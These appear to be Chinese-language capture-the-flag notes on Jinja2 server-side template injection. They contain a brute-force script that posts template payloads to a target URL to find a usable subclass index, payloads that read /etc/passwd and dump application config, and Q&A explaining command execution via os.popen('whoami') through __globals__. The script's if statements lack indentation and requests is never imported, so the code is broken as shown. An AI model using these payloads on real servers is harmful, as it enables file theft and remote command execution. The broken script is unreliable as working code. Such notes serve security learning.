```python
url = input('请输入URL链接：')

for i in range(500):
	data = {"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
	try:
		response = requests.post(url, data=data)
		if response.status_code == 200:
		if '_frozen_importlib_external.FileLoader' in response.text:
		print(i)
	except:
		pass
```

### payload


- `name={{''.__class__.__base__.__subclasses__()[79]["get_data"](0,"/etc/passwd")}}`
- `name={{config}}`（配置文件可能藏有 flag）



### 关于`get_data()` 读取文件

是一种底层文件的读取方法

Python 2：`get_data(文件打开模式, 文件路径)`  

Python 3：`get_data(文件路径)`


关于文件打开模式：
- `0` = 只读模式（r）
- `1` = 只写模式（w）
- `2` = 读写模式（r+）
- `3` = 追加模式（a）

## Q&A
---

### Q：为什么 `get_data()` 不需要 `init.globals`？
A：

payload 中的 get_data：`__subclasses__()[79]["get_data"](0,"/etc/passwd")`

是类内部自带的方法，不需要实例化，即不需要 `__init__.__globals__`，直接 `[索引].方法名(参数)` 就能用

### Q：为什么其他函数需要 `init.globals`？
A:

因为大多数函数（如 `open`、`os.popen`、`eval`）不在子类里，它们在全局命名空间里

必须：先找一个有 `__init__` 的类，通过 `__globals__` 拿到全局环境，再从里面捞函数

### Q：为什么这两个payload：`{{url_for.__globals__.os.popen('whoami').read()}}`与 `{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}`最后的`os.popen`的调用不同？
A：

其效果是相同的，因为`__globals__`的结果是一个字典对象

而字典键访问有两种写法：

- `dict['key']`：标准 Python 字典索引  
- `dict.key`：Jinja2 简化语法，前提是键名必须是合法 Python 标识符
